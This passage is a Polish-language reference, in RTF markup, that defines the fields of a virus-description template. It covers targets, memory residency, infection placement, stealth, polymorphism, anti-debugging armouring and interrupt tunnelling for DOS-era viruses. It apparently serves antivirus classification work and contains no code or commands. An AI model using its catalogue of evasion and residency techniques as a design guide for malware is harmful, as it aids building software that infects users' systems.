\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ALIASES: lista oddzielonych kropk\uc1\u261\'b9, innych nazw wirusa; w przypadku braku - puste pole; nazwa mo\uc1\u380\'bfe zawiera\uc1\u263\'e6 znaki przestankowe; cudzys\uc1\u322\'b3\'f3w () oznacza propozycj\uc1\u281\'ea nazwy.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NAME.HISTORY: oddzielone przecinkami poprzednie nazwy w konwencji CARO (je\uc1\u380\'bfeli istnia\uc1\u322\'b3y).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LAST_NAME_CHANGE: data ostatniej zmiany nazwy wirusa.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TARGETS: okre\uc1\u347\'9cla obiekty atakowane przez wirusa; mo\uc1\u380\'bfliwe o}{\f1\fs24\lang1045{\*\listtag0}biekty to:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch COM - pliki COM, rozpoznawane po pierwszych 2 bajtach programu.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch EXE - pliki EXE, rozpoznawane po pierwszych 2 bajtach programu (r\'f3wne MZ lub ZM).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .COM - pliki COM, rozpoznawane po rozszerzeniu pliku. .EXE - pliki EXE, rozpoznawane po rozszerzeni}{\f0\fs24\lang1045{\*\listtag0}u pliku. ZM - w przypadku, gdy wirus sprawdza pierwsze 2 bajty programu (znacznik MZ lub ZM). SYS - zara\uc1\u380\'bfa sterowniki w plikach SYS. OVR - zara\uc1\u380\'bfa pliki nak\uc1\u322\'b3adkowe.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NE_W - potrafi infekowa\uc1\u263\'e6 pliki new executable dla Windows. NE_OS2 - potrafi infekowa\uc1\u263\'e6 pliki new executable dla OS/2. NewEXE - potrafi infekowa\uc1\u263\'e6 pliki new executable, ale bez sprawdzania systemu, dla kt\'f3rego plik Jest przeznaczony. DIR - zara\uc1\u380\'bfa przy u\uc1\u380\'bfyciu JAP.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MBR - infekuje G\uc1\u322\'b3\'f3wny Rekord \uc1\u321\'a3aduj\uc1\u261\'b9cy twardego dysku. FBR - zara\uc1\u380\'bfa BOOT-sektory dyskietek. HER - zara\uc1\u380\'bfa BOOT-sektory twardych dysk\'f3w. BAT - zara\uc1\u380\'bfa pliki wsadowe BAT. OBJ - zara\uc1\u380\'bfa pliki OBJ. LIB - zara\uc1\u380\'bfa pliki LIB.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch COMP - wirus jest typu towarzysz\uc1\u261\'b9cego (w nawiasie mo\uc1\u380\'bfe by\uc1\u263\'e6 okre\uc1\u347\'9clone rozszerzenie plik\'f3w wykorzystywanych przez wirusa, np. EXE/C}{\f1\fs24\lang1045{\*\listtag0}OM). }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OTHER - wirus infekuje inny obiekt, nie opisany powy\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch RESIDENT: okre\uc1\u347\'9cla, czy wirus zostawia po uruchomieniu jaki\uc1\u347\'9c \uc1\u347\'9clad w pami\uc1\u281\'eaci;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mo\uc1\u380\'bfliwe warto\uc1\u347\'9cci to:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NONE - to nie jest wirus rezydentny.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PAYLOAD - wirus nie jest rezydentny, ale instaluje rezydent}{\f0\fs24\lang1045{\*\listtag0}ny kod, np. bomb\uc1\u281\'ea.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IVT - wirus rezyduje w tablicy przerwa\uc1\u324\'f1. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch FIRSTMCB - wirus rezyduje w MCB nale\uc1\u380\'bf\uc1\u261\'b9cym do DOS-a. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BUFFER - wirus rezyduje w obszarze bufor\'f3w DOS. }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LOW - wirus rezyduje jak zwyk\uc1\u322\'b3y TSR. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TWIXT (przestarza\uc1\u322\'b3e) - wirus rezyduje za ostatnim blokiem pami\uc1\u281\'eaci.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TwixtAny - wirus zmniejsza rozmiar aktualnego MCB. }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TwixtZ - wirus zmniejsza rozmiar aktualnego MCB, je\uc1\u380\'bfeli jest to ostatni blok w \uc1\u322\'b3a\uc1\u324\'f1cuchu (tzn. MCB ma znacznik Z). }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NewMCB - wirus zmniejsza rozmiar aktualnego MCB i tworzy w tak powsta\uc1\u322\'b3ym blok}{\f1\fs24\lang1045{\*\listtag0}u nowy MCB z przepisaniem znacznika z aktualnego bloku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NewEndMCB - zmniejsza aktualny blok MCB i tworzy w tak powsta\uc1\u322\'b3ym miejscu nowy MCB ze znacznikiem Z; w aktualnym MCB zmienia znacznik bloku na M.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch UPPER - wirus pr\'f3buje zaalokowa\uc1\u263\'e6 pami\uc1\u281\'ea\uc1\u263\'e6 powy\uc1\u380\'bf}{\f1\fs24\lang1045{\*\listtag0}ej 640kB (UMB).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch HIGH - wirus pr\'f3buje zaalokowa\uc1\u263\'e6 pami\uc1\u281\'ea\uc1\u263\'e6 w obszarze od IMb do (l Mb + 64 Kb - 16).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TOP - wirus rezyduje w bloku pami\uc1\u281\'eaci powsta\uc1\u322\'b3ym na skutek zmniejszenia pami\uc1\u281\'eaci widzianej przez BIOS (zmienna 0040:0013). }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch UNMARKED - wirus rezyduje na ko\uc1\u324\'f1cu dost\uc1\u281\'eapnej pami\uc1\u281\'eaci, jednak miejsca tego w \uc1\u380\'bfaden spos\'f3b nie chroni. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VIDEO - wirus rezyduje w pami\uc1\u281\'eaci ekranu. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch EXT - wirus rezyduje w pami\uc1\u281\'eaci XMS. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch EXP - wirus rezyduje w pami\uc1\u281\'eaci EMS. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AT addr - wirus rezyduje w pami\uc1\u281\'eaci pod wyspecyfikowanym adresem [addr] i miejsca tego w \uc1\u380\'bfaden spos\'f3b nie chroni przed zapisem, np. w obszarze zmiennych DOS. OTHER - wirus instaluje si\uc1\u281\'ea w pami\uc1\u281\'eaci przy pomocy innej, me opisanej powy\uc1\u380\'bfej techniki.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Below - wirus manipuluje blokami MCB i lokuje si\uc1\u281\'ea w pami\uc1\u281\'eaci przed aktualnym blokiem MCB.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MEMORY_SIZE: okre\uc1\u347\'9cla ilo\uc1\u347\'9c\uc1\u263\'e6 pami\uc1\u281\'eaci zajmowanej przez wirusa w pami\uc1\u281\'eaci w bajtach, kilobajtach (na ko\uc1\u324\'f1cu litera K) lub w paragrafach (litera P na ko\uc1\u324\'f1cu).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STORAGE_SIZE: rozmiar wirusa na dysku w bajtach, kilobajtach (na ko\uc1\u324\'f1cu litera K), jednostkach JAP (na ko\uc1\u324\'f1cu litera C) lub sektorach (litera S na ko\uc1\u324\'f1cu);}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch w przypadku wyr\'f3wnywania d\uc1\u322\'b3ugo\uc1\u347\'9cci pliku do jakiej\uc1\u347\'9c wielokrotno\uc1\u347\'9cci nale\uc1\u380\'bfy to uwzgl\uc1\u281\'eadni\uc1\u263\'e6 w d\uc1\u322\'b3ugo\uc1\u347\'9cci wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WHERE: opisuje spos\'f3b dzia\uc1\u322\'b3ania wirusa (mo\uc1\u380\'bfe by\uc1\u263\'e6 to lista oddzielona kropkami).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dla plik\'f3w s\uc1\u261\'b9 mo\uc1\u380\'bfliw}{\f1\fs24\lang1045{\*\listtag0}e:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OVERWRITES - wirus nadpisuje i w efekcie niszczy plik. }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PREPENDING - wirus umieszcza sw\'f3j kod w pliku przed oryginalnym kodem programu (przesuwa oryginalny kod do przodu). }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOVE - wirus zachowuje nadpisywany przez siebie pocz\uc1\u261\'b9tek pliku na jego ko\uc1\u324\'f1cu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AP}{\f0\fs24\lang1045{\*\listtag0}PENDING (przestarza\uc1\u322\'b3e) - wirus dopisuje si\uc1\u281\'ea na ko\uc1\u324\'f1cu pliku. }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch EOIMAGE - dopisuje si\uc1\u281\'ea za obrazem pliku EXE (d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 obrazu obliczana jest na podstawie nag\uc1\u322\'b3\'f3wka). }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch EOFILE - wirus dopisuje si\uc1\u281\'ea na ko\uc1\u324\'f1cu pliku. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch HEADER - wirus instaluje si\uc1\u281\'ea w nag\uc1\u322\'b3\'f3wku pliku EXE.}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SPLIT - wirus umieszcza siew pliku pomi\uc1\u281\'eadzy nag\uc1\u322\'b3\'f3wkiem pliku EXE a reszt\uc1\u261\'b9 pliku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DATA - wirus nadpisuje obszar pliku zawieraj\uc1\u261\'b9cy sta\uc1\u322\'b3e warto\uc1\u347\'9cci (np. ci\uc1\u261\'b9g zer).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch RANDOM - plik doczepia si\uc1\u281\'ea w przypadkowym miejscu pliku. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SLACK - wirus korzysta z luki powsta}{\f0\fs24\lang1045{\*\listtag0}\uc1\u322\'b3ej na ko\uc1\u324\'f1cu pliku nie wykorzystuj\uc1\u261\'b9cego ca\uc1\u322\'b3ej JAP. COMPANION - wirus jest typu towarzysz\uc1\u261\'b9cego. }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OTHER - wirus u\uc1\u380\'bfywa innej techniki, nie opisanej powy\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dla sektor\'f3w mo\uc1\u380\'bfliwe s\uc1\u261\'b9:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AT ttt/hh/ss - na \uc1\u347\'9ccie\uc1\u380\'bfce ttt, g\uc1\u322\'b3owicy hh, w sektorze ss. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AT_LSN nn - w logicznym sektorze nn. }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AT_CN nn - w JAP numer nn.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRACK nn - na dodatkowej \uc1\u347\'9ccie\uc1\u380\'bfce nn. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BAD - w jednostce JAP oznaczonej jako z\uc1\u322\'b3a.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH: okre\uc1\u347\'9cla list\uc1\u281\'ea przerwa\uc1\u324\'f1 i funkcji wykorzystywanych przez wirusa;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mo\uc1\u380\'bfliwe s\uc1\u261\'b9 dwa kluczowe s\uc1\u322\'b3owa:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NONE }{\f0\fs24\lang1045{\*\listtag0}- wirus nie u\uc1\u380\'bfywa techniki stealth.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DRIVER - wirus instaluje si\uc1\u281\'ea jako sterownik.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch POLYMORPHIC: okre\uc1\u347\'9cla, Jak polimorficzny jest wirus, przecinek oddziela s\uc1\u322\'b3owa kluczowe, mo\uc1\u380\'bfliwe s\uc1\u261\'b9:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NONE - wirus nie u\uc1\u380\'bfywa procedur szyfruj\uc1\u261\'b9cych. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CONST - wirus u\uc1\u380\'bfywa sta\uc1\u322\'b3ego sposobu szyfrowania, ze sta\uc1\u322\'b3\uc1\u261\'b9 procedur\uc1\u261\'b9 dekodera.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VAR - wirus u\uc1\u380\'bfywa zmiennej procedury szyfruj\uc1\u261\'b9cej, ale sta\uc1\u322\'b3ego dekodera.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WILDCARD - wirus u\uc1\u380\'bfywa zmiennej procedury szyfruj\uc1\u261\'b9cej oraz zmiennego dekodera, mo\uc1\u380\'bfliwego do wykrycia przy u\uc1\u380\'bfyciu sygnatur ze znakami g}{\f1\fs24\lang1045{\*\listtag0}lobalnymi.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch POLY-nn - wirus u\uc1\u380\'bfywa zmiennej procedury szyfruj\uc1\u261\'b9cej oraz zmiennego dekodera; liczba nn okre\uc1\u347\'9cla ilo\uc1\u347\'9c\uc1\u263\'e6 sta\uc1\u322\'b3ych bajt\'f3w (w dowolnym miejscu w dekoderze); 00 - oznacza najbardziej zaawansowany polimorfizm. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ENTRY - wirus ukrywa miejsce wej\uc1\u347\'9ccia do ko}{\f1\fs24\lang1045{\*\listtag0}du. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SWAP - wirus przemieszcza (na zasadzie anagramu) cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 swojego kodu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OTHER - wirus u\uc1\u380\'bfywa innego polimorfizmu, nie opisanego powy\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ARMOURING: sposoby obrony stosowane przez wirusa; mo\uc1\u380\'bfliwe to:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NONE - wirus nie stosuje \uc1\u380\'bfadnych metod.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CODE - wirus stosuje sztuczki antydeasemblerowe.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CRYPT - wirus stosuje kilkustopniowe szyfrowanie.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRACE - wirus wy\uc1\u322\'b3\uc1\u261\'b9cza przerwania INT l i INT 3.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KBD - wirus wy\uc1\u322\'b3\uc1\u261\'b9cza klawiatur\uc1\u281\'ea podczas uruchamiania.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SELFTRACE - wirus u\uc1\u380\'bfywa INT 1 i INT 3 w dekoderze.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT1 - wirus u\uc1\u380\'bfywa INT 1, INT3 - wirus u\uc1\u380\'bfywa INT 3.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PREFETCH - wirus u\uc1\u380\'bfywa sztuczek antydebuggerowych, wykorzystuj\uc1\u261\'b9cych kolejk\uc1\u281\'ea rozkazowa do wykrycia, czy jego kod nie jest \uc1\u347\'9cledzony przy u\uc1\u380\'bfyciu debuggera. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OTHER - wirus u\uc1\u380\'bfywa innej techniki, nie opisanej powy\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TUNNEL}{\f0\fs24\lang1045{\*\listtag0}LING: okre\uc1\u347\'9cla, czy wirus u\uc1\u380\'bfywa tunelingu.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NONE - wirus nie u\uc1\u380\'bfywa tunelingu. NEXT - wirus potrafi omin\uc1\u261\'b9\uc1\u263\'e6 ostatnio zainstalowany program TSR.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch HAND21 - wirus potrafi odnale\uc1\u378\'9f\uc1\u263\'e6 i wykorzysta\uc1\u263\'e6 oryginalny adres wej\uc1\u347\'9ccia do przerwania 21h.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DRIVER - wirus u\uc1\u380\'bfywa procedur obs\uc1\u322\'b3ugi sterownik\'f3w. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SECTOR - wirus u\uc1\u380\'bfywa INT 13h przy dost\uc1\u281\'eapie do dysku. }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch HAND13 - wirus potrafi odnale\uc1\u378\'9f\uc1\u263\'e6 i wykorzysta\uc1\u263\'e6 oryginalny adres wej\uc1\u347\'9ccia do przerwania INT 13h.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BIOS - wirus u\uc1\u380\'bfywa bezpo\uc1\u347\'9crednich wywo\uc1\u322\'b3a\uc1\u324\'f1 procedur ROM" BIOS do obs\uc1\u322\'b3ugi dysk\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch HAR}{\f0\fs24\lang1045{\*\listtag0}DWARE - wirus u\uc1\u380\'bfywa dost\uc1\u281\'eapu do dysku poprzez porty. }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OTHER -wirus u\uc1\u380\'bfywa innej techniki tunelingu, nie opisanej powy\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W przypadku HAND21, HAND13 i BIOS mo\uc1\u380\'bfna wyliczy\uc1\u263\'e6 (w nawiasach) metody wyszukiwania oryginalnego adresu; mo\uc1\u380\'bfliwe s\uc1\u322\'b3owa kluczowe to:}{\f0\fs24\lang1045{\*\listtag0}\par}
